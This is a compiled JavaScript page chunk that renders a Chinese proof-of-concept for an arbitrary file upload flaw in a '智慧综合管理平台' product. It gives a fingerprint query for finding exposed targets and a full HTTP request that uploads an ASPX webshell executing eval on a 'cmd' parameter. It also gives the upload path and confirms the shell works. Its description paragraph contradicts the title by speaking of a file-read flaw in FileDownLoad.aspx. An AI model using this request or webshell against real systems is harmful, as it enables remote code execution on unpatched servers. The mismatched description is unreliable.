(window.webpackJsonp=window.webpackJsonp||[]).push([[292],{2659:function(s,a,t){s.exports=t.p+"assets/img/1627914977251-450973a6-e847-454b-817b-efa35fdc4aed.72080f3d.png"},2660:function(s,a,t){s.exports=t.p+"assets/img/1629368451848-7ecbcd3e-82cc-4608-b9a9-a312826248ea.5453e485.png"},2661:function(s,a,t){s.exports=t.p+"assets/img/1629368525052-fffda86a-30fa-4dc0-a3a0-537a0be5b5c3.e3e58eb8.png"},3455:function(s,a,t){"use strict";t.r(a);var n=t(64),e=Object(n.a)({},(function(){var s=this,a=s._self._c;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("h1",{attrs:{id:"银达汇智-智慧综合管理平台-fileup-aspx-任意文件上传漏洞"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#银达汇智-智慧综合管理平台-fileup-aspx-任意文件上传漏洞"}},[s._v("#")]),s._v(" 银达汇智 智慧综合管理平台 FileUp.aspx 任意文件上传漏洞")]),s._v(" "),a("h2",{attrs:{id:"漏洞描述"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[s._v("#")]),s._v(" 漏洞描述")]),s._v(" "),a("p",[s._v("银达汇智 智慧综合管理平台 FileDownLoad.aspx 存在任意文件读取漏洞，通过漏洞攻击者可下载服务器中的任意文件")]),s._v(" "),a("h2",{attrs:{id:"漏洞影响"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[s._v("#")]),s._v(" 漏洞影响")]),s._v(" "),a("a-checkbox",{attrs:{checked:""}},[s._v("银达汇智 智慧综合管理平台 ")]),a("br"),s._v(" "),a("h2",{attrs:{id:"网络测绘"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[s._v("#")]),s._v(" 网络测绘")]),s._v(" "),a("a-checkbox",{attrs:{checked:""}},[s._v('"汇智信息" && title=="智慧综合管理平台登入"')]),a("br"),s._v(" "),a("h2",{attrs:{id:"漏洞复现"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[s._v("#")]),s._v(" 漏洞复现")]),s._v(" "),a("p",[s._v("登陆页面")]),s._v(" "),a("p",[a("img",{attrs:{src:t(2659),alt:"img"}})]),s._v(" "),a("p",[s._v("文件上传请求包")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("POST /Module/FileUpPage/FileUp.aspx?orgid"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&")]),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("type")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("NNewsContent HTTP/1.1\nHost: \nAccept-Encoding: identity\nContent-Length: "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("337")]),s._v("\nAccept-Language: zh-CN,zh"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("q")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0.8")]),s._v("\nAccept: */*\nUser-Agent: Mozilla/5.0 "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("Windows NT "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("5.1")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" rv:5.0"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" Gecko/20100101 Firefox/5.0\nAccept-Charset: GBK,utf-8"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("q")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0.7")]),s._v(",*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("q")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0.3")]),s._v("\nConnection: keep-alive\nCache-Control: max-age"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v("\nContent-Type: multipart/form-data"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("boundary")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("62907949903a4c499178971c9dab4ad9\n\n"),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("--62907949903a4c499178971c9dab4ad9")]),s._v("\nContent-Disposition: form-data"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("name")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"Filedata"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("filename")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"abc.aspx"')]),s._v("\nContent-Type: image/jpeg\n\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("%@ Page "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("Language")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"Jscript"')]),s._v("%"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("%Response.Write"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("FormsAuthentication.HashPasswordForStoringInConfigFile"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"abc"')]),s._v(", "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"MD5"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(".ToLower"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("))")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("eval"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("Request.Item"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"cmd"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(","),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"unsafe"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("%"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\n--62907949903a4c499178971c9dab4ad9--\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br")])]),a("p",[a("img",{attrs:{src:t(2660),alt:"img"}})]),s._v(" "),a("p",[s._v("响应包会返回文件名，上传的目录为")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("/imgnews/imgcontent/1/xxxxxxxxxx.aspx\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("img",{attrs:{src:t(2661),alt:"img"}})]),s._v(" "),a("p",[s._v("出现如图成功上传木马，密码为 "),a("code",[s._v("cmd")])])],1)}),[],!1,null,null,null);a.default=e.exports}}]);